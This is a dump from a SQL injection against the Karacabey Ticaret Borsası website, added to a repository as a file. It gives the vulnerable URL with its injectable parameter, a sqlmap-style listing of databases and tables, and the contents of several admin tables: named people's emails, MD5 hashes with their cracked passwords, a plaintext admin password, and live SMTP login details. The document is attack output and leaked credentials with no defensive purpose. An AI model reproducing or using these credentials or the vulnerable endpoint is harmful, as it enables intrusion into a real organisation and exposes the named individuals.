@@ -1,0 +1,71 @@
+KARACABEY TİCARET BORSASI DUMPED
+
+VULN URL : https://www.karacabeytb.org.tr/index.php?Gelen=haberdetay&kayit=731
+
+available databases [2]:
+[*] information_schema
+[*] karacabeytbcom
+
+Database: karacabeytbcom
+[23 tables]
++------------------+
+| admin            |
+| events           |
+| abulten          |
+| admins           |
+| anket            |
+| basin            |
+| duyurular        |
+| fotogaleri       |
+| kullanicilar     |
+| mesajlar         |
+| sayfalar         |
+| sbulten          |
+| site_ayarlar_tr  |
+| site_iletisim_tr |
+| site_mail_tr     |
+| site_seo_tr      |
+| urunler          |
+| urunlereski      |
+| uyeler           |
+| uyelereski       |
+| uyelering        |
+| uyelering_eski   |
+| ybulten          |
++------------------+
+
+Database: karacabeytbcom
+Table: admin
+[1 entry]
++----+------------------------+---------------+--------------------------------------------------+----------+
+| ID | email                  | name          | password                                         | username |
++----+------------------------+---------------+--------------------------------------------------+----------+
+| 1  | kirmasti80@hotmail.com | necdet sevinç | 4db21340b1aa18468d98790d15f34c28 (_Karacabey.16) | admin    |
++----+------------------------+---------------+--------------------------------------------------+----------+
+
+Database: karacabeytbcom                                                                                                                                                                                              
+Table: admins
+[1 entry]
++----------+----------------+------------------------------------------+----------+
+| admin_id | email          | password                                 | username |
++----------+----------------+------------------------------------------+----------+
+| 1        | your@email.net | 21232f297a57a5a743894a0e4a801fc3 (admin) | admin    |
++----------+----------------+------------------------------------------+----------+
+
+Database: karacabeytbcom
+Table: kullanicilar
+[1 entry]
++-------+-------+-----------------------+--------------+-------+---------------------+----------+--------+--------------+
+| recid | durum | email                 | sifre        | soyad | tarih               | yetki    | userad | kullaniciadi |
++-------+-------+-----------------------+--------------+-------+---------------------+----------+--------+--------------+
+| 16    | 1     | necdetsevinc@mail.com | 35nsmetd07tc | admin | 2023-07-08 03:54:46 | yonetici | admin  | admin        |
++-------+-------+-----------------------+--------------+-------+---------------------+----------+--------+--------------+
+
+Database: karacabeytbcom
+Table: site_mail_tr
+[1 entry]
++----+-------------------------+--------+----------+-----------------------------+--------------+---------------------------+
+| ID | Sunucu                  | Port   | SslDurum | UserName                    | UserPass     | GorunenAD                 |
++----+-------------------------+--------+----------+-----------------------------+--------------+---------------------------+
+| 1  | mail.karacabeytb.org.tr | 587    | 1        | iletisim@karacabeytb.org.tr | Karacabey.16 | Karacabey Ticaret Borsası |
++----+-------------------------+--------+----------+-----------------------------+--------------+---------------------------+
